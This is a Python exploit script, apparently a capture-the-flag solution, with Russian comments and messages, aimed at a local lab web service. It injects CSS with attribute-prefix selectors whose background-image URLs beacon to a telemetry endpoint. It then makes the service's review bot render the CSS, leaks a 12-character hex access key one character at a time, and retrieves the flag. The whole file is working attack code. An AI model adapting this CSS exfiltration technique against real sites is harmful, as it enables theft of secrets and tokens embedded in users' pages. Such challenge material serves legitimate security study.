#!/usr/bin/env python3
"""Восстановить ключ страницы оттиска с помощью CSS-селекторов."""

import argparse
import http.cookiejar
import json
import time
import urllib.error
import urllib.parse
import urllib.request

ALPHABET = "0123456789abcdef"
KEY_LENGTH = 12


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("base", nargs="?", default="http://127.0.0.1:34090")
    args = parser.parse_args()
    base = args.base.rstrip("/")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def request(path, data=None):
        payload = None if data is None else json.dumps(data).encode()
        req = urllib.request.Request(
            base + path,
            data=payload,
            headers={"Content-Type": "application/json"} if payload is not None else {},
        )
        with opener.open(req, timeout=25) as response:
            return json.load(response)

    prefix = ""
    for position in range(KEY_LENGTH):
        rules = []
        for ch in ALPHABET:
            guess = prefix + ch
            beacon = "/api/telemetry?probe=" + urllib.parse.quote(guess)
            rules.append(
                f'body[data-access-key^="{guess}"] '
                f'{{ background-image: url("{beacon}"); }}'
            )
        plate = request("/api/plates", {"css": "\n".join(rules)})
        plate_id = plate["id"]
        request(f"/api/plates/{plate_id}/review", {})
        deadline = time.monotonic() + 25
        while True:
            status = request(f"/api/plates/{plate_id}")
            if status["status"] == "complete":
                break
            if status["status"] == "error":
                raise RuntimeError(status.get("error", "проверка не удалась"))
            if time.monotonic() >= deadline:
                raise TimeoutError("истекло время проверки")
            time.sleep(0.35)
        hits = request(f"/api/plates/{plate_id}/telemetry")["hits"]
        guesses = [hit["probe"] for hit in hits if len(hit["probe"]) == position + 1]
        if len(set(guesses)) != 1:
            raise RuntimeError(f"неоднозначный ответ для позиции {position}: {guesses}")
        prefix = guesses[0]
        print(f"[{position + 1}/{KEY_LENGTH}] {prefix}")

    result = request("/api/archive?" + urllib.parse.urlencode({"key": prefix}))
    print(result["flag"])
    print("Улика:", result["clue"])


if __name__ == "__main__":
    main()
